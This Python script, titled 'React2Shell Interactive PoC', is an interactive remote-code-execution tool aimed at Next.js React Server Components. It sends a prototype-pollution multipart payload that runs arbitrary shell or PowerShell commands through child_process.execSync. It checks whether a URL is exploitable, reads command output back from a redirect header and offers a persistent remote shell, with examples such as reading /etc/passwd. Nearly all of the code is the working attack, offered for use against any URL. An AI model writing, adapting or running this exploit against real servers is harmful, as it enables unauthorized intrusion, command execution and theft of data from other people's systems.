#!/usr/bin/env python3
# /// script
# requires-python = ">=3.9"
# dependencies = [
#     "requests>=2.28.0",
#     "prompt_toolkit>=3.0.0",
# ]
# ///
"""
React2Shell Interactive — prompt_toolkit-based interactive shell for RCE PoC

Usage:
  python3 interactive.py
  python3 interactive.py https://example.com
"""

import re
import sys
import os
import json
import shlex
import time
import base64
from datetime import datetime
from urllib.parse import urlparse, unquote
from typing import Optional

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    print("Error: 'requests' library required. Install with: pip install requests")
    sys.exit(1)

try:
    from prompt_toolkit import PromptSession
    from prompt_toolkit.history import FileHistory
    from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
    from prompt_toolkit.completion import Completer, Completion, FuzzyWordCompleter
    from prompt_toolkit.styles import Style
    from prompt_toolkit.formatted_text import FormattedText
except ImportError:
    print("Error: 'prompt_toolkit' library required. Install with: pip install prompt_toolkit")
    sys.exit(1)


HISTORY_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".interactive_history")
STATE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".interactive_state")
MAX_RETRIES = 5
RETRY_BASE_DELAY = 2


DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0",
    "Next-Action": "x",
    "X-Nextjs-Request-Id": "b5dce965",
    "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
}


class Colors:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"


style = Style.from_dict({
    "prompt": "ansicyan bold",
    "prompt.dollar": "ansigreen bold",
    "prompt.path": "ansiyellow",
})


class State:
    def __init__(self):
        self.url: str = ""
        self.remote_path: str = "~"
        self.timeout: int = 15
        self.verify_ssl: bool = True
        self.windows: bool = False
        self.last_cmd: str = ""
        self.cmds: list[str] = []

    def save(self):
        data = {
            "url": self.url,
            "remote_path": self.remote_path,
            "timeout": self.timeout,
            "verify_ssl": self.verify_ssl,
            "windows": self.windows,
        }
        try:
            with open(STATE_FILE, "w") as f:
                json.dump(data, f)
        except Exception:
            pass

    def load(self):
        try:
            with open(STATE_FILE) as f:
                data = json.load(f)
            self.url = data.get("url", "")
            self.remote_path = data.get("remote_path", "~")
            self.timeout = data.get("timeout", 15)
            self.verify_ssl = data.get("verify_ssl", True)
            self.windows = data.get("windows", False)
        except Exception:
            pass

    def forget(self):
        self.url = ""
        self.remote_path = "~"
        self.last_cmd = ""
        self.cmds.clear()
        try:
            os.unlink(STATE_FILE)
        except Exception:
            pass


state = State()

DIR_CACHE: dict[str, list[str]] = {}
DIR_CACHE_TS: dict[str, float] = {}
CACHE_TTL = 10


class RemoteCompleter(Completer):
    builtin = [
        "url", "exec", "retry", "info", "history",
        "clear", "set", "help", "exit", "quit", "cd",
    ]
    unix = [
        "ls", "cat", "cd", "pwd", "whoami", "id", "uname", "echo",
        "head", "tail", "grep", "find", "sort", "cut", "tr", "awk",
        "sed", "xargs", "tee", "wc", "cp", "mv", "rm", "mkdir",
        "rmdir", "touch", "chmod", "chown", "ps", "kill", "df", "du",
        "tar", "gzip", "gunzip", "zip", "unzip", "curl", "wget",
        "python", "python3", "node", "env", "export", "su", "sudo",
        "systemctl", "service", "ip", "ping", "date", "uptime", "free",
        "nano", "vim", "vi", "git", "docker",
    ]

    def get_completions(self, document, complete_event):
        text = document.text_before_cursor
        word = document.get_word_before_cursor()
        if not text.strip():
            return
        after_space = " " in text.rstrip()

        if not after_space:
            all_cmds = set(self.builtin) | set(self.unix)
            for cmd in sorted(all_cmds):
                if cmd.startswith(word.lower()):
                    yield Completion(cmd, start_position=-len(word))
            return

        is_path = (
            word.startswith("/")
            or word.startswith("./")
            or word.startswith("../")
            or word.startswith("~")
            or "/" in word
        )
        if is_path:
            yield from self._remote_paths(word)

    def _remote_paths(self, word: str):
        if not state.url:
            return
        if "/" in word:
            dir_part = word[: word.rfind("/") + 1] or "/"
            prefix = word[word.rfind("/") + 1 :]
        else:
            dir_part = "./"
            prefix = word

        now = time.time()
        if dir_part in DIR_CACHE and now - DIR_CACHE_TS.get(dir_part, 0) < CACHE_TTL:
            entries = DIR_CACHE[dir_part]
        else:
            try:
                body, ct = build_rce_payload(
                    f"ls -1p {dir_part} 2>/dev/null; ls -1ap {dir_part} 2>/dev/null",
                    windows=False,
                )
                h = dict(DEFAULT_HEADERS)
                h["Content-Type"] = ct
                r = requests.post(
                    state.url, headers=h, data=body.encode(),
                    timeout=5, verify=state.verify_ssl, allow_redirects=False,
                )
                m = re.search(r"/login\?a=([^;]*)", r.headers.get("X-Action-Redirect", ""))
                raw = base64.b64decode(m.group(1)).decode() if m else ""
                entries = sorted(set(raw.strip().split("\n"))) if raw.strip() else []
            except Exception:
                entries = []
            DIR_CACHE[dir_part] = entries
            DIR_CACHE_TS[dir_part] = now

        for e in entries:
            if e.startswith(prefix) and e not in (".", ".."):
                yield Completion(e, start_position=-len(word))


def colorize(text: str, color: str) -> str:
    return f"{color}{text}{Colors.RESET}"


def build_rce_payload(command: str, windows: bool = False) -> tuple[str, str]:
    boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

    if windows:
        cmd = f'powershell -c \\\"{command}\\\"'
        prefix_payload = (
            f"var res=process.mainModule.require('child_process').execSync('{cmd}')"
            f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
            f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
        )
    else:
        encoded = base64.b64encode(command.encode()).decode()
        prefix_payload = (
            f"var r;try{{r=process.mainModule.require('child_process')"
            f".execSync('echo {encoded} | base64 -d | sh');}}"
            f"catch(e){{r=e.stderr||e.stdout||e.message;}}"
            f"var b=Buffer.from(r).toString('base64');"
            f"throw Object.assign(new Error('NEXT_REDIRECT'),"
            f"{{digest: `NEXT_REDIRECT;push;/login?a=${{b}};307;`}});"
        )

    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
        + prefix_payload
        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )

    body = (
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="2"\r\n\r\n'
        f"[]\r\n"
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        f'Content-Disposition: form-data; name="3"\r\n\r\n'
        f'{{"\\"\u0024\u0024":{{}}}}\r\n'
        f"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"
    )

    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def send_raw(url: str, command: str, timeout: int, verify: bool) -> tuple[Optional[str], Optional[str]]:
    body, content_type = build_rce_payload(command, windows=state.windows)
    headers = dict(DEFAULT_HEADERS)
    headers["Content-Type"] = content_type

    try:
        body_bytes = body.encode("utf-8")
        response = requests.post(
            url, headers=headers, data=body_bytes,
            timeout=timeout, verify=verify, allow_redirects=False,
        )
        redirect_header = response.headers.get("X-Action-Redirect", "")
        match = re.search(r"/login\?a=([^;]*)", redirect_header)
        if match:
            raw = unquote(match.group(1))
            try:
                decoded = base64.b64decode(raw).decode()
                return decoded, None
            except Exception:
                return raw, None
        if response.status_code == 500:
            return None, "HTTP 500"
        if response.status_code == 405:
            return None, "HTTP 405"
        return None, f"HTTP {response.status_code}"
    except KeyboardInterrupt:
        raise
    except requests.exceptions.SSLError as e:
        return None, f"SSL Error: {e}"
    except requests.exceptions.ConnectionError as e:
        return None, f"Connection Error: {e}"
    except requests.exceptions.Timeout:
        return None, "Request timed out"
    except RequestException as e:
        return None, f"Request failed: {e}"
    except Exception as e:
        return None, f"Unexpected error: {e}"


def exec_remote(command: str) -> tuple[Optional[str], Optional[str], int]:
    p = state.remote_path
    if p and p != "~" and p != os.path.expanduser("~"):
        command = f"cd {shlex.quote(p)}; {command}"
    last_error = None
    for attempt in range(1, MAX_RETRIES + 1):
        output, error = send_raw(
            state.url, command,
            timeout=state.timeout, verify=state.verify_ssl,
        )
        if output is not None:
            return output, None, attempt
        last_error = error
        if attempt < MAX_RETRIES:
            delay = RETRY_BASE_DELAY * attempt
            ts = datetime.now().strftime("%H:%M:%S")
            print(
                f"  [{ts}] {colorize('[!]', Colors.YELLOW)} "
                f"Attempt {attempt}/{MAX_RETRIES}: {error} — retry in {delay}s"
            )
            try:
                time.sleep(delay)
            except KeyboardInterrupt:
                print()
                return None, "cancelled", attempt
    return None, last_error, MAX_RETRIES


def get_host(url: str) -> str:
    parsed = urlparse(url)
    return parsed.netloc or parsed.path


def print_status(tag: str, tag_color: str, msg: str):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"  [{ts}] {colorize(tag, tag_color)} {msg}")


def check_vulnerability(url: str) -> Optional[str]:
    output, error = send_raw(url, "echo $((41*271))", timeout=state.timeout, verify=state.verify_ssl)
    if output and "11111" in output:
        return None
    if error:
        return error
    return f"Not vulnerable (got {output!r}, expected output containing 11111)"


def resolve_remote_path(path: str) -> Optional[str]:
    if path == "~":
        output, error, _ = exec_remote("pwd")
        if output:
            return output
        return None
    return path


def cmd_url(url: str):
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"
    url = url.rstrip("/")
    state.url = url

    print_status("probing", Colors.CYAN, f"{url} ...")
    err = check_vulnerability(url)
    if err:
        print_status("FAIL", Colors.RED, err)
        print_status("[!]", Colors.YELLOW, "URL rejected — try another with 'url <URL>'")
        state.url = ""
        state.save()
        return

    print_status("VULN", Colors.RED + Colors.BOLD, f"{url} — target is exploitable")

    output, error = send_raw(state.url, "pwd", timeout=state.timeout, verify=state.verify_ssl)
    if output:
        state.remote_path = output
    else:
        state.remote_path = "~"

    host = get_host(url)
    print_status("cwd", Colors.CYAN, f"{host}:{state.remote_path}")
    state.save()


def cmd_cd(path: str):
    if not state.url:
        print_status("[!]", Colors.YELLOW, "Set a target URL first: url <URL>")
        return

    path = path.split()[0] if path.split() else "~"

    if path == "~":
        pass
    elif path.startswith("~/"):
        path = path[2:]

    resolved = resolve_remote_path(path)
    if resolved:
        state.remote_path = resolved
        state.save()
        return
    print_status("[!]", Colors.YELLOW, f"cd: {path}: No such directory")


def cmd_exec(command: str):
    if not state.url:
        print_status("[!]", Colors.YELLOW, "Set a target URL first: url <URL>")
        return

    full_cmd = command

    state.last_cmd = command
    state.cmds.append(command)
    print_status("exec", Colors.CYAN, f"`{command}`")

    output, error, attempts = exec_remote(full_cmd)

    if output is not None:
        print(f"  {colorize(output, Colors.WHITE + Colors.BOLD)}")
        print_status("ok", Colors.GREEN, f"({attempts} attempt{'s' if attempts > 1 else ''})")
    else:
        print_status("error", Colors.RED, error or "unknown error")


def cmd_retry():
    if not state.last_cmd:
        print_status("[!]", Colors.YELLOW, "No command to retry")
        return
    cmd_exec(state.last_cmd)


def cmd_info():
    print()
    print(f"  {colorize('Session', Colors.BOLD)}")
    print(f"  {colorize('─' * 50, Colors.DIM)}")
    print(f"  {'URL':12} {colorize(state.url or '(none)', Colors.CYAN)}")
    print(f"  {'Path':12} {colorize(state.remote_path, Colors.YELLOW)}")
    print(f"  {'Timeout':12} {state.timeout}s")
    print(f"  {'Verify SSL':12} {state.verify_ssl}")
    print(f"  {'Mode':12} {'Windows' if state.windows else 'Unix'}")
    print(f"  {'Max retries':12} {MAX_RETRIES}")
    print(f"  {'History':12} {len(state.cmds)} commands")
    print()


def cmd_history():
    if not state.cmds:
        print_status("info", Colors.BLUE, "no commands yet")
        return
    print()
    for i, c in enumerate(state.cmds, 1):
        print(f"  {i:>4}  {c}")
    print()


def cmd_help():
    print(f"""
  {colorize('Commands', Colors.BOLD)}
    {colorize('url <URL>', Colors.GREEN)}       set target URL (probes vulnerability)
    {colorize('cd [path]', Colors.GREEN)}       change remote working directory
    {colorize('<command>', Colors.GREEN)}        execute on target (bare words work)
    {colorize('!<command>', Colors.GREEN)}       also executes on target
    {colorize('retry', Colors.GREEN)}            retry last command
    {colorize('info', Colors.GREEN)}             show session info
    {colorize('history', Colors.GREEN)}          show command history
    {colorize('set <k> <v>', Colors.GREEN)}      set option (timeout, verify, windows)
    {colorize('clear', Colors.GREEN)}            clear screen
    {colorize('help', Colors.GREEN)}             this help
    {colorize('exit', Colors.GREEN)}             exit

  {colorize('Options', Colors.BOLD)}
    timeout   request timeout in seconds  {colorize('set timeout 30', Colors.DIM)}
    verify    SSL verification on/off     {colorize('set verify false', Colors.DIM)}
    windows   windows payload on/off      {colorize('set windows true', Colors.DIM)}

  {colorize('Examples', Colors.BOLD)}
    url https://example.com
    whoami
    cd /tmp
    cat /etc/passwd
""")


def cmd_set(key: str, value: str):
    if key == "timeout":
        try:
            state.timeout = int(value)
            print_status("set", Colors.GREEN, f"timeout = {state.timeout}s")
            state.save()
        except ValueError:
            print_status("[!]", Colors.YELLOW, "timeout must be an integer")
    elif key == "verify":
        state.verify_ssl = value.lower() in ("1", "true", "yes", "on")
        print_status("set", Colors.GREEN, f"verify_ssl = {state.verify_ssl}")
        state.save()
    elif key == "windows":
        state.windows = value.lower() in ("1", "true", "yes", "on")
        print_status("set", Colors.GREEN, f"windows_mode = {state.windows}")
        state.save()
    else:
        print_status("[!]", Colors.YELLOW, f"unknown key: {key}")


def make_prompt() -> FormattedText:
    if state.url:
        host = get_host(state.url)
        p = state.remote_path
        if p == os.path.expanduser("~") or p == "~":
            p = "~"
        return FormattedText([
            ("class:prompt", f" {host} "),
            ("class:prompt.path", p),
            ("class:prompt.dollar", " % "),
        ])
    return FormattedText([
        ("class:prompt", " react2shell "),
        ("class:prompt.dollar", " % "),
    ])


def dispatch(line: str):
    line = line.strip()
    if not line:
        return

    state.cmds.append(line)

    if line in ("exit", "quit"):
        state.save()
        print_status("exit", Colors.BLUE, "bye")
        sys.exit(0)

    if line == "clear":
        os.system("clear" if os.name == "posix" else "cls")
        return
    if line == "help":
        cmd_help()
        return
    if line == "info":
        cmd_info()
        return
    if line == "history":
        cmd_history()
        return
    if line == "retry":
        cmd_retry()
        return

    if line.startswith("url "):
        cmd_url(line[4:].strip())
        return

    if line.startswith("cd "):
        cmd_cd(line[3:].strip())
        return
    if line == "cd":
        cmd_cd("~")
        return

    if line.startswith("set "):
        parts = line[4:].strip().split(None, 1)
        if len(parts) < 2:
            print_status("[!]", Colors.YELLOW, "usage: set <key> <value>")
            return
        cmd_set(parts[0], parts[1])
        return

    if line.startswith("!"):
        cmd_exec(line[1:].strip())
        return

    if line.startswith("exec "):
        cmd_exec(line[5:].strip())
        return

    cmd_exec(line)


def prompt_url() -> str:
    print(f"  {colorize('React2Shell Interactive PoC', Colors.BOLD)}")
    print(f"  {colorize('─' * 40, Colors.DIM)}")
    print()

    url_session = PromptSession(
        message=FormattedText([
            ("class:prompt", " target "),
            ("class:prompt.dollar", " URL> "),
        ]),
        style=style,
    )

    while True:
        try:
            raw = url_session.prompt()
        except (KeyboardInterrupt, EOFError):
            print()
            sys.exit(0)
        raw = raw.strip()
        if not raw:
            continue
        return raw


def main():
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    state.load()

    if len(sys.argv) > 1:
        cmd_url(sys.argv[1])
    elif state.url:
        host = get_host(state.url)
        print(f"  {colorize(f'Restored session: {host}:{state.remote_path}', Colors.DIM)}")
        print_status("re-probe", Colors.CYAN, f"{state.url} ...")
        err = check_vulnerability(state.url)
        if err:
            print_status("FAIL", Colors.RED, f"{err} — session invalid")
            state.forget()
        else:
            print_status("VULN", Colors.GREEN, "target still exploitable")
    else:
        raw = prompt_url()
        cmd_url(raw)

    print()

    commands = [
        "url", "exec", "retry", "info", "history",
        "clear", "set", "help", "exit", "quit", "cd",
    ]
    completer = FuzzyWordCompleter(commands)

    session: PromptSession = PromptSession(
        history=FileHistory(HISTORY_FILE),
        auto_suggest=AutoSuggestFromHistory(),
        completer=completer,
        style=style,
        complete_while_typing=True,
    )

    while True:
        try:
            text = session.prompt(make_prompt())
        except KeyboardInterrupt:
            continue
        except EOFError:
            print()
            break

        try:
            dispatch(text)
        except KeyboardInterrupt:
            print()
            continue


if __name__ == "__main__":
    main()
